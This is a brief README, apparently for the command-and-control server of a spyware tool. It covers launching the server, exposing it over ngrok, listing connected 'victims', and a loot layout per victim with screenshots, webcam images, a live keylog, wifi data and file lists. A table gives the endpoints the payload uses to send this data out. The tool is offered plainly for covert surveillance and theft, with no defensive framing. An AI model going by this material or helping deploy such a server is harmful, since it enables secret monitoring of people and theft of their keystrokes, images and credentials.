# C2 Server

```bash
python server.py
```

**Modes:**
- `[1]` Local — LAN IP, same network only
- `[2]` ngrok — free public URL, no router config needed (get token at ngrok.com)

**In terminal while running:**
```
v  → show all connected victims (hostname, user, OS, IP)
l  → list loot folders
q  → quit
```

**Loot structure:**
```
loot/
├── VICTIM-PC/
│   ├── sysinfo.txt
│   ├── screenshot.png
│   ├── webcam.jpg
│   ├── keylog.txt       ← live, appended every 30s
│   ├── wifi.txt
│   └── files.txt
└── VICTIM-PC.zip        ← full archive
```

**Endpoints (used by payload):**

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/ping` | POST | First contact — sends JSON sysinfo |
| `/upload` | POST | Sends a file (binary) |
| `/text` | POST | Sends text data |
| `/keylog` | POST | Appends keylog chunk |
| `/done` | POST | Triggers zip creation |
